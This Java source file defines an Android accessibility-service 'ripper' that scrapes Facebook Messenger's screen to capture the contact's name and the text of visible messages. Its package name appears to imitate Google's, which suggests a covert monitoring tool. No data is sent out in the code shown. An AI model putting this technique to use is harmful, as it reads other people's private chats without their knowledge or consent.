package service.android.google.com.accessibility.util.ripper.rippers;

import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.List;

import service.android.google.com.accessibility.model.ChatEvent;
import service.android.google.com.accessibility.model.ChatMessage;
import service.android.google.com.accessibility.model.PackageConstants;

/**
 * Ripper for Messenger.
 * Rips the visible messages on screen.
 * https://play.google.com/store/apps/details?id=com.facebook.orca
 */
public class MessengerRipper extends AbstractChatWindowRipper {

    public static final String TAB_INDICATOR_RES_ID = "tab_indicator";
    public static final String CONTACT_NAME_RES_ID = "thread_title_name";
    public static final String MESSAGE_CONTAINER_RES_ID = "message_container";

    public MessengerRipper() {
        super(PackageConstants.APP_MESSENGER);
    }

    @Override
    public ChatEvent getWindowInfoEventFromAccessibilityNodeInfo(AccessibilityNodeInfo nodeInfo) {
        ChatEvent.Builder builder = ChatEvent.builder();
        builder.packageName(nodeInfo.getPackageName().toString());

        final List<AccessibilityNodeInfo> contact_name = nodeInfo.findAccessibilityNodeInfosByViewId(getFQResourceID(CONTACT_NAME_RES_ID));
        if (contact_name.size() < 1) {
            return null;
        }
        // TODO: 13.03.16 not yet tested with multiple chat heads presumably a wrong contactName will be fetched.
        final String contactName = contact_name.get(0).getContentDescription().toString();
        this.contactPerson = getContactPersonFromName(contactName);

        List<AccessibilityNodeInfo> tab_indicator = nodeInfo.findAccessibilityNodeInfosByViewId(getFQResourceID(TAB_INDICATOR_RES_ID));
        if (tab_indicator.size() >= 1) {
            return ripInApplicationMode(builder, nodeInfo);
        } else {
            return ripInChatHeadMode(builder, nodeInfo);
        }
    }

    private ChatEvent ripInChatHeadMode(final ChatEvent.Builder unfinishedBuilder,
                                        final AccessibilityNodeInfo nodeInfo) {
        final List<AccessibilityNodeInfo> message_text_containers = nodeInfo.findAccessibilityNodeInfosByViewId(getFQResourceID(MESSAGE_CONTAINER_RES_ID));

        if (message_text_containers.size() < 1) {
            return null;
        }

        final List<ChatMessage> messages = getChatMessagesFromMessageContainer(message_text_containers);

        return unfinishedBuilder
                .messages(messages)
                .build();
    }

    private ChatEvent ripInApplicationMode(final ChatEvent.Builder unfinishedBuilder,
                                           final AccessibilityNodeInfo nodeInfo) {
        return null;
    }

    private List<ChatMessage> getChatMessagesFromMessageContainer(final List<AccessibilityNodeInfo> message_text_containers) {
        List<ChatMessage> chatMessages = new ArrayList<>();
        for (final AccessibilityNodeInfo message_container : message_text_containers) {
            final boolean contactPersonMessages = message_container.getChildCount() == 2;
            if (contactPersonMessages) {
                String message = message_container.getChild(1).getChild(0).getText().toString();
                chatMessages.add(ChatMessage.builder()
                        .person(contactPerson)
                        .text(message)
                        .build());
            } else {
                String message = message_container.getChild(0).getChild(0).getText().toString();
                chatMessages.add(ChatMessage.builder()
                        .person(you)
                        .text(message)
                        .build());
            }
        }
        return chatMessages;
    }
}